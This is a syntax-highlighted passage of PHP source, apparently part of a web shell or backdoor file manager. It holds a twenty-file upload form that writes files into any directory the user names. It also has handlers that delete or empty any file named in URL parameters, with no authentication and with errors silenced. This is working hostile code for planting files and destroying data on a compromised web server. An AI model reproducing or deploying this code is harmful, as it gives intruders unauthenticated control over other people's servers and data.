<span class="lineno">1842</span> <span class="s2">&lt;input type=file name=text6 size=43&gt; &lt;input type=file name=text16 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1843</span> <span class="s2">&lt;input type=file name=text7 size=43&gt; &lt;input type=file name=text17 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1844</span> <span class="s2">&lt;input type=file name=text8 size=43&gt; &lt;input type=file name=text18 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1845</span> <span class="s2">&lt;input type=file name=text9 size=43&gt; &lt;input type=file name=text19 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1846</span> <span class="s2">&lt;input type=file name=text10 size=43&gt; &lt;input type=file name=text20 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1847</span> <span class="s2">&lt;input name=where size=43 value=&#39;</span><span class="si">$d</span><span class="s2">&#39;&gt;&lt;br&gt;</span>
<span class="lineno">1848</span> <span class="s2">&lt;input type=submit value=Upload name=massupload&gt;</span>
<span class="lineno">1849</span> <span class="s2">&lt;/form&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1850</span> 
<span class="lineno">1851</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;massupload&#39;</span><span class="p">]){</span>
<span class="lineno">1852</span> <span class="nv">$where</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">];</span>
<span class="lineno">1853</span> <span class="nv">$uploadfile1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text1&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1854</span> <span class="nv">$uploadfile2</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text2&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1855</span> <span class="nv">$uploadfile3</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text3&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1856</span> <span class="nv">$uploadfile4</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text4&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1857</span> <span class="nv">$uploadfile5</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text5&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1858</span> <span class="nv">$uploadfile6</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text6&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1859</span> <span class="nv">$uploadfile7</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text7&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1860</span> <span class="nv">$uploadfile8</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text8&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1861</span> <span class="nv">$uploadfile9</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text9&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1862</span> <span class="nv">$uploadfile10</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text10&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1863</span> <span class="nv">$uploadfile11</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text11&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1864</span> <span class="nv">$uploadfile12</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text12&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1865</span> <span class="nv">$uploadfile13</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text13&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1866</span> <span class="nv">$uploadfile14</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text14&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1867</span> <span class="nv">$uploadfile15</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text15&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1868</span> <span class="nv">$uploadfile16</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text16&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1869</span> <span class="nv">$uploadfile17</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text17&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1870</span> <span class="nv">$uploadfile18</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text18&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1871</span> <span class="nv">$uploadfile19</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text19&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1872</span> <span class="nv">$uploadfile20</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text20&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">1873</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text1&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile1</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1874</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1875</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile1</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1876</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text2&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile2</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1877</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1878</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile2</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1879</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text3&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile3</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1880</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1881</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile3</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1882</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text4&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile4</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1883</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1884</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile4</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1885</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text5&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile5</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1886</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1887</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile5</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1888</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text6&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile6</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1889</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1890</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile6</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1891</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text7&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile7</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1892</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1893</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile7</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1894</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text8&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile8</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1895</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1896</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile8</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1897</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text9&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile9</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1898</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1899</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile9</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1900</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text10&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile10</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1901</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1902</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile10</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1903</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text11&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile11</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1904</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1905</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile11</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1906</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text12&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile12</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1907</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1908</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile12</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1909</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text13&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile13</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1910</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1911</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile13</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1912</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text14&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile14</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1913</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1914</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile14</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1915</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text15&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile15</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1916</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1917</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile15</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1918</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text16&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile16</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1919</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1920</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile16</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1921</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text17&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile17</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1922</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1923</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile17</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1924</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text18&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile18</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1925</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1926</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile18</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1927</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text19&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile19</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1928</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1929</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile19</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1930</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text20&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile20</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1931</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1932</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;Uploaded to </span><span class="si">$uploadfile20</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1933</span> <span class="p">}</span>
<span class="lineno">1934</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1935</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno">1936</span> 
<span class="lineno">1937</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;yes&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="lineno">1938</span> <span class="nv">$d</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span> <span class="nv">$e</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="lineno">1939</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">);</span>
<span class="lineno">1940</span> <span class="nv">$delresult</span><span class="o">=</span><span class="s2">&quot;Success </span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2"> deleted &lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">2;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1941</span> <span class="s2">}</span>
<span class="lineno">1942</span> <span class="s2">if(@</span><span class="si">$_GET[&#39;clean&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="lineno">1943</span> <span class="s2">@</span><span class="si">$e</span><span class="s2">=</span><span class="si">$_GET[&#39;e&#39;]</span><span class="s2">;</span>
<span class="lineno">1944</span> <span class="si">$x</span><span class="s2">=fopen(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$e</span><span class="s2">&quot;,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="lineno">1945</span> <span class="s2">fwrite(</span><span class="si">$x</span><span class="s2">,&quot;&quot;);</span>
